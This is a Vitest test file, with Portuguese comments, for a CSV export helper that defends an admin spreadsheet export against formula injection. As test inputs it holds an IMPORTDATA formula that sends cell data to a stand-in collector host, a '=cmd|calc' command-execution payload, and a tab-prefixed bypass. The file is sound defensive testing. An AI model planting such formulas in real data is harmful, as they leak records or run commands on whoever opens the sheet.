import { describe, expect, it } from 'vitest';
import { celulaCsv, linhaCsv } from './csv';

/**
 * O CSV do /admin sai de dados que qualquer visitante escreve.
 *
 * Estes testes descrevem a diferença entre um arquivo que a planilha lê
 * como lista de cadastros e um que ela lê como programa.
 */
describe('celulaCsv', () => {
  it('mantém texto comum intocado, só entre aspas', () => {
    expect(celulaCsv('Maria Silva')).toBe('"Maria Silva"');
    expect(celulaCsv('maria@exemplo.com')).toBe('"maria@exemplo.com"');
  });

  it('neutraliza os quatro caracteres que iniciam fórmula', () => {
    for (const inicio of ['=', '+', '-', '@']) {
      const celula = celulaCsv(`${inicio}HYPERLINK("http://x")`);
      expect(celula.startsWith('"\'')).toBe(true);
    }
  });

  it('neutraliza a fórmula escondida atrás de espaço em branco', () => {
    /* A planilha descarta tabulação e quebra de linha antes de olhar para
       o primeiro caractere: sem estes na lista, `\t=cmd` chega como
       `=cmd` e a defesa cai com um caractere invisível. */
    expect(celulaCsv('\t=1+1')).toBe('"\'\t=1+1"');
    expect(celulaCsv('\r=1+1')).toBe('"\'\r=1+1"');
  });

  it('protege o caso real: IMPORTDATA vazando a lista para fora', () => {
    /* No Google Sheets esta fórmula busca um endereço externo sozinha, no
       instante em que a planilha abre — a lista de leads sai sem que
       ninguém clique em nada. */
    const nome = '=IMPORTDATA("https://coletor.exemplo/?x="&A2)';

    /* A apóstrofe na frente é o que faz a planilha ler a linha como texto;
       as aspas internas saem duplicadas, que é o escape do formato. */
    expect(celulaCsv(nome)).toBe(`"'${nome.replace(/"/g, '""')}"`);
    expect(celulaCsv(nome).startsWith('"\'=IMPORTDATA')).toBe(true);
  });

  it('duplica as aspas internas para não partir a coluna', () => {
    expect(celulaCsv('Maria "Bit" Silva')).toBe('"Maria ""Bit"" Silva"');
  });

  it('trata ausência como célula vazia, e não como "undefined"', () => {
    expect(celulaCsv(undefined)).toBe('""');
    expect(celulaCsv(null)).toBe('""');
  });
});

describe('linhaCsv', () => {
  it('junta as células com vírgula, cada uma já protegida', () => {
    expect(linhaCsv(['=cmd|calc', 'a,b', undefined])).toBe('"\'=cmd|calc","a,b",""');
  });
});
